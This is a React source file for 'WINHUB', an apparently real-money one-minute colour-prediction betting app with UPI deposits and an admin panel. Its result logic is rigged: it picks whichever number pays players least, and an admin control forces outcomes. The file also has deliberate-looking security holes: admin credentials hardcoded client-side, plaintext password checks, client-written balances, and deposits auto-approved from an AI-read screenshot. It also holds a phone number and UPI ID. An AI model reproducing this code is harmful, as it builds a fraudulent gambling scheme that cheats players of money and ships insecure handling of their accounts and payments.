import React, { useState, useEffect, useCallback, useRef } from 'react';
import { createClient } from '@supabase/supabase-js';
import { GoogleGenAI } from "@google/genai";

// --- 1. CONFIGURATION (Using Vite Environment Variables) ---
const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;
const GEMINI_KEY = import.meta.env.VITE_GEMINI_API_KEY;

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
const genAI = new GoogleGenAI(GEMINI_KEY);

const ADMIN_PHONE = "7351446843";
const ADMIN_PASS = "06032007";

// --- 2. TYPES ---
type Color = 'green' | 'red' | 'violet';
interface GameResult { period: string; number: number; colors: Color[]; big_small: string; }
interface Bet { id: number; user_phone: string; period: string; selection: string; amount: number; status: 'pending' | 'win' | 'loss'; win_amount: number; }

export default function App() {
  // Navigation & User State
  const [view, setView] = useState<'auth' | 'player' | 'admin'>('auth');
  const [tab, setTab] = useState<'home' | 'wingo' | 'wallet' | 'account'>('home');
  const [user, setUser] = useState<any>(null);
  const [balance, setBalance] = useState(0);

  // Game State
  const [timer, setTimer] = useState(60);
  const [period, setPeriod] = useState("");
  const [history, setHistory] = useState<GameResult[]>([]);
  const [showResult, setShowResult] = useState<any>(null);
  
  // Admin & Deposit State
  const [forcedResult, setForcedResult] = useState<number | null>(null);
  const [upiList, setUpiList] = useState<any[]>([]);
  const [pendingDeposits, setPendingDeposits] = useState<any[]>([]);

  // --- 3. CORE GAME ENGINE (Timer & Result Logic) ---
  useEffect(() => {
    const interval = setInterval(() => {
      const now = new Date();
      const seconds = now.getSeconds();
      setTimer(60 - seconds);

      const dateStr = now.toISOString().slice(0, 10).replace(/-/g, '');
      const pId = `${dateStr}100${now.getHours() * 60 + now.getMinutes()}`;
      
      if (period !== pId) {
        setPeriod(pId);
        if (period !== "") processGameResult(period); // Settle previous round
        fetchData();
      }
    }, 1000);
    return () => clearInterval(interval);
  }, [period]);

  const fetchData = async () => {
    const { data: hist } = await supabase.from('game_history').select('*').order('id', { ascending: false }).limit(15);
    if (hist) setHistory(hist);
    const { data: upis } = await supabase.from('upi_settings').select('*').eq('is_active', true);
    if (upis) setUpiList(upis);
  };

  const processGameResult = async (periodToSettle: string) => {
    // A. House Wins Logic: Calculate payout for all numbers and pick the cheapest
    const { data: activeBets } = await supabase.from('bets').select('*').eq('period', periodToSettle).eq('status', 'pending');
    
    let winningNumber: number;
    if (forcedResult !== null) {
      winningNumber = forcedResult;
    } else {
      const payouts = Array.from({ length: 10 }, (_, num) => {
        let total = 0;
        activeBets?.forEach(bet => {
          const colors = getColors(num);
          if (bet.selection === num.toString()) total += bet.amount * 9;
          if (bet.selection === 'Big' && num >= 5) total += bet.amount * 2;
          if (bet.selection === 'Small' && num < 5) total += bet.amount * 2;
          if (bet.selection === 'Green' && colors.includes('green')) total += (num === 5 ? bet.amount * 1.5 : bet.amount * 2);
          if (bet.selection === 'Red' && colors.includes('red')) total += (num === 0 ? bet.amount * 1.5 : bet.amount * 2);
          if (bet.selection === 'Violet' && colors.includes('violet')) total += bet.amount * 4.5;
        });
        return { num, total };
      });
      payouts.sort((a, b) => a.total - b.total);
      winningNumber = payouts[0].num;
    }

    // B. Save Result
    const colors = getColors(winningNumber);
    const { data: resEntry } = await supabase.from('game_history').insert({
      period: periodToSettle,
      number: winningNumber,
      colors,
      big_small: winningNumber >= 5 ? 'Big' : 'Small'
    }).select().single();

    // C. Settle Bets in Database
    // (In a real app, this should be a Postgres Function, but here's the logic for UI simulation)
    // After settling, we trigger the Win/Loss popup for the current user
    if (user) checkUserResult(periodToSettle, winningNumber);
    setForcedResult(null);
  };

  const getColors = (n: number): Color[] => {
    if (n === 0) return ['red', 'violet'];
    if (n === 5) return ['green', 'violet'];
    return [1, 3, 7, 9].includes(n) ? ['green'] : ['red'];
  };

  const checkUserResult = async (p: string, winNum: number) => {
    const { data: myBet } = await supabase.from('bets').select('*').eq('user_phone', user.phone).eq('period', p).single();
    if (myBet) {
      const win = isWinning(myBet.selection, winNum);
      const winAmt = win ? calculateWin(myBet.selection, myBet.amount, winNum) : 0;
      
      // Show Popup
      setShowResult({
        status: win ? 'win' : 'loss',
        period: p,
        selection: myBet.selection,
        winNumber: winNum,
        amount: win ? winAmt : myBet.amount
      });

      // Update balance
      if (win) {
        const newBal = balance + winAmt;
        setBalance(newBal);
        await supabase.from('profiles').update({ balance: newBal }).eq('phone', user.phone);
      }
    }
  };

  const isWinning = (sel: string, num: number) => {
    const colors = getColors(num);
    if (sel === num.toString()) return true;
    if (sel === 'Big' && num >= 5) return true;
    if (sel === 'Small' && num < 5) return true;
    if (sel === 'Green' && colors.includes('green')) return true;
    if (sel === 'Red' && colors.includes('red')) return true;
    if (sel === 'Violet' && colors.includes('violet')) return true;
    return false;
  };

  const calculateWin = (sel: string, amt: number, num: number) => {
    if (sel === num.toString()) return amt * 9;
    if (sel === 'Violet') return amt * 4.5;
    if (['Big', 'Small'].includes(sel)) return amt * 2;
    return [0, 5].includes(num) ? amt * 1.5 : amt * 2;
  };

  // --- 4. PLAYER ACTIONS (Betting & Deposit) ---
  const handleBet = async (selection: string, amount: number) => {
    if (balance < amount) return alert("Insufficient balance!");
    const newBal = balance - amount;
    setBalance(newBal);
    
    await supabase.from('profiles').update({ balance: newBal }).eq('phone', user.phone);
    await supabase.from('bets').insert({ user_phone: user.phone, period, selection, amount });
    alert("Bet Placed!");
  };

  const handleDeposit = async (amt: number, utr: string, file: File) => {
    // AI Verification
    const reader = new FileReader();
    reader.readAsDataURL(file);
    reader.onload = async () => {
      const base64 = (reader.result as string).split(',')[1];
      const model = genAI.getGenerativeModel({ model: "gemini-1.5-flash" });
      const prompt = `Verify this payment: UTR ${utr}, Amount ${amt}. Return JSON: {"match": boolean}`;
      
      try {
        const result = await model.generateContent([prompt, { inlineData: { data: base64, mimeType: file.type } }]);
        const aiRes = JSON.parse(result.response.text());
        
        let status = 'pending';
        if (aiRes.match) {
          status = 'approved';
          const newBal = balance + amt;
          setBalance(newBal);
          await supabase.from('profiles').update({ balance: newBal }).eq('phone', user.phone);
        }
        
        await supabase.from('deposits').insert({ user_phone: user.phone, amount: amt, utr, status, screenshot: reader.result as string });
        alert(status === 'approved' ? "Instant Approval!" : "Submitted for Review");
      } catch (e) { alert("AI Error, submitted manually"); }
    };
  };

  // --- 5. AUTH LOGIC ---
  const handleLogin = async (p: string, pw: string) => {
    if (p === ADMIN_PHONE && pw === ADMIN_PASS) {
      setView('admin');
      const { data: deps } = await supabase.from('deposits').select('*').eq('status', 'pending');
      if (deps) setPendingDeposits(deps);
      return;
    }
    const { data: prof } = await supabase.from('profiles').select('*').eq('phone', p).eq('password', pw).single();
    if (prof) { setUser(prof); setBalance(prof.balance); setView('player'); }
    else alert("Invalid Login");
  };

  // --- 6. COMPONENTS ---
  const Ball = ({ n, size = "w-10 h-10" }: { n: number, size?: string }) => {
    let bg = "bg-[#fb5b5b]";
    if (n === 0) bg = "bg-gradient-to-r from-[#fb5b5b] 50% to-[#b659fe] 50%";
    else if (n === 5) bg = "bg-gradient-to-r from-[#18b660] 50% to-[#b659fe] 50%";
    else if ([1, 3, 7, 9].includes(n)) bg = "bg-[#18b660]";
    return <div className={`${size} rounded-full flex items-center justify-center text-white font-bold text-sm shadow-md ${bg}`}>{n}</div>;
  };

  // --- 7. MAIN RENDER ---
  return (
    <div className="max-w-md mx-auto min-h-screen bg-[#0a0a0a] text-white flex flex-col font-sans selection:bg-amber-500">
      {view === 'auth' ? (
        <div className="flex-1 flex flex-col items-center justify-center p-10">
          <h1 className="text-5xl font-black text-amber-500 mb-2 tracking-tighter italic">WINHUB</h1>
          <p className="text-slate-500 text-[10px] uppercase tracking-[0.3em] font-bold mb-12">91 Club Exclusive</p>
          <div className="w-full space-y-4">
            <input id="p" placeholder="Phone Number" className="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none focus:border-amber-500 transition" />
            <input id="pw" type="password" placeholder="Password" className="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none focus:border-amber-500 transition" />
            <button onClick={() => handleLogin((document.getElementById('p') as any).value, (document.getElementById('pw') as any).value)} className="w-full bg-gradient-to-r from-amber-500 to-orange-600 p-4 rounded-2xl font-black shadow-xl shadow-amber-500/20 active:scale-95 transition">LOGIN</button>
          </div>
        </div>
      ) : view === 'player' ? (
        <div className="flex-1 overflow-y-auto pb-24">
          {/* Top Bar */}
          <div className="p-4 bg-[#1a1a1a] flex justify-between items-center sticky top-0 z-50 border-b border-white/5">
            <div className="flex flex-col">
              <span className="text-[9px] text-slate-500 font-bold uppercase tracking-widest">Balance</span>
              <span className="text-xl font-black text-amber-500">₹{balance.toFixed(2)}</span>
            </div>
            <div className="flex gap-2">
              <div className="bg-white/5 px-3 py-1.5 rounded-xl border border-white/10 flex items-center gap-2">
                <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></div>
                <span className="text-[10px] font-mono font-bold">00:{timer < 10 ? `0${timer}` : timer}</span>
              </div>
            </div>
          </div>

          {tab === 'home' && (
            <div className="p-4 space-y-4">
               <div className="bg-gradient-to-br from-orange-500 to-red-600 p-6 rounded-[32px] shadow-2xl relative overflow-hidden">
                 <h2 className="text-2xl font-black italic">WINGO 1Min</h2>
                 <p className="text-[10px] opacity-70 font-bold">Period: {period}</p>
                 <div className="absolute right-[-10px] bottom-[-10px] text-8xl opacity-10">🎯</div>
               </div>
               <div className="grid grid-cols-5 gap-3 bg-white/5 p-5 rounded-[32px] border border-white/5">
                 {[0,1,2,3,4,5,6,7,8,9].map(n => <button key={n} onClick={() => handleBet(n.toString(), 10)} className="active:scale-90 transition"><Ball n={n} size="w-12 h-12" /></button>)}
               </div>
               <div className="flex gap-3">
                 <button onClick={() => handleBet('Green', 10)} className="flex-1 bg-[#18b660] py-4 rounded-2xl font-black shadow-lg shadow-green-500/20 active:scale-95 transition">GREEN</button>
                 <button onClick={() => handleBet('Violet', 10)} className="flex-1 bg-[#b659fe] py-4 rounded-2xl font-black shadow-lg shadow-purple-500/20 active:scale-95 transition">VIOLET</button>
                 <button onClick={() => handleBet('Red', 10)} className="flex-1 bg-[#fb5b5b] py-4 rounded-2xl font-black shadow-lg shadow-red-500/20 active:scale-95 transition">RED</button>
               </div>
               <div className="bg-white/5 rounded-[32px] border border-white/5 overflow-hidden">
                 <div className="p-4 border-b border-white/5 flex justify-between">
                   <span className="text-[10px] font-bold text-slate-500 uppercase">Recent Records</span>
                 </div>
                 <div className="divide-y divide-white/5">
                   {history.map((h, i) => (
                     <div key={i} className="flex justify-between p-4 items-center">
                       <span className="text-xs font-mono opacity-40">{h.period.slice(-4)}</span>
                       <Ball n={h.number} size="w-7 h-7" />
                       <span className={`text-[10px] font-bold px-3 py-1 rounded-full ${h.big_small === 'Big' ? 'bg-orange-500/10 text-orange-500' : 'bg-blue-500/10 text-blue-500'}`}>{h.big_small}</span>
                     </div>
                   ))}
                 </div>
               </div>
            </div>
          )}

          {tab === 'wallet' && (
            <div className="p-4 space-y-6">
              <div className="bg-white text-black p-8 rounded-[40px] space-y-6 shadow-2xl">
                <h3 className="text-center font-black text-xl">Deposit Money</h3>
                <div className="bg-slate-100 p-4 rounded-2xl text-center border-2 border-dashed border-amber-500">
                  <p className="text-[10px] font-bold text-slate-400 mb-1">UPI ID</p>
                  <p className="font-black text-lg">{upiList[0]?.upi_id || "8477088145@ybl"}</p>
                </div>
                <div className="space-y-4">
                  <input type="number" id="da" placeholder="Amount" className="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl" />
                  <input id="du" placeholder="12-Digit UTR" className="w-full p-4 bg-slate-50 border border-slate-200 rounded-2xl" />
                  <input type="file" id="df" className="text-xs" />
                  <button onClick={() => handleDeposit(
                    Number((document.getElementById('da') as any).value),
                    (document.getElementById('du') as any).value,
                    (document.getElementById('df') as any).files[0]
                  )} className="w-full bg-black text-white p-5 rounded-2xl font-black">Submit</button>
                </div>
              </div>
            </div>
          )}

          {/* Bottom Nav */}
          <nav className="fixed bottom-0 w-full max-w-md h-20 bg-[#1a1a1a] border-t border-white/5 flex items-center justify-around z-50">
            {['home', 'wingo', 'wallet', 'account'].map((t, i) => (
              <button key={t} onClick={() => setTab(t as any)} className="flex flex-col items-center gap-1">
                <div className={`text-xl ${tab === t ? 'text-amber-500' : 'text-slate-500'}`}>
                  {i === 0 ? '🏠' : i === 1 ? '🎯' : i === 2 ? '💳' : '👤'}
                </div>
                <span className={`text-[9px] font-bold uppercase tracking-widest ${tab === t ? 'text-white' : 'text-slate-500'}`}>{t}</span>
              </button>
            ))}
          </nav>
        </div>
      ) : (
        /* --- ADMIN PANEL --- */
        <div className="flex-1 bg-slate-50 text-slate-900 p-6 overflow-y-auto">
          <div className="flex justify-between items-center mb-8">
             <h2 className="text-3xl font-black tracking-tighter italic">ADMIN</h2>
             <button onClick={() => setView('auth')} className="bg-slate-900 text-white px-4 py-2 rounded-xl text-xs font-bold">Logout</button>
          </div>
          <div className="bg-white p-6 rounded-[32px] shadow-sm mb-6">
            <h3 className="text-xs font-bold text-slate-400 uppercase mb-4">Wingo Control</h3>
            <div className="grid grid-cols-5 gap-2">
              {[0,1,2,3,4,5,6,7,8,9].map(n => (
                <button key={n} onClick={() => setForcedResult(n)} className={`p-2 border-2 rounded-2xl transition ${forcedResult === n ? 'border-amber-500 bg-amber-50' : 'border-slate-100'}`}>
                  <Ball n={n} size="w-8 h-8" />
                </button>
              ))}
            </div>
          </div>
          <div className="space-y-4">
             <h3 className="text-xs font-bold text-slate-400 uppercase">Pending Deposits</h3>
             {pendingDeposits.map(d => (
               <div key={d.id} className="bg-white p-5 rounded-[32px] shadow-sm border border-slate-100">
                  <div className="flex justify-between font-black text-lg mb-1">
                    <span>{d.user_phone}</span>
                    <span className="text-green-600">₹{d.amount}</span>
                  </div>
                  <p className="text-[10px] font-mono text-slate-400 mb-4">UTR: {d.utr}</p>
                  <button className="w-full bg-green-500 text-white py-3 rounded-2xl font-black text-xs">Approve</button>
               </div>
             ))}
          </div>
        </div>
      )}

      {/* Win/Loss Popup */}
      {showResult && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 backdrop-blur-md p-8">
           <div className={`w-full max-w-xs rounded-[40px] p-8 text-center shadow-2xl ${showResult.status === 'win' ? 'bg-gradient-to-b from-amber-400 to-orange-600' : 'bg-[#1a1a1a] border border-white/10'}`}>
              <div className="text-7xl mb-6">{showResult.status === 'win' ? '🏆' : '😢'}</div>
              <h2 className="text-3xl font-black italic text-white mb-2">{showResult.status === 'win' ? 'CONGRATS!' : 'LOSE'}</h2>
              <div className="bg-black/20 rounded-2xl p-4 mb-6">
                 <p className="text-[10px] opacity-60">Result: {showResult.winNumber} | Selection: {showResult.selection}</p>
              </div>
              <p className="text-5xl font-black text-white mb-10">₹{showResult.amount.toFixed(2)}</p>
              <button onClick={() => setShowResult(null)} className="w-full bg-white/20 py-4 rounded-2xl font-black text-white">CLOSE</button>
           </div>
        </div>
      )}
    </div>
  );
    }
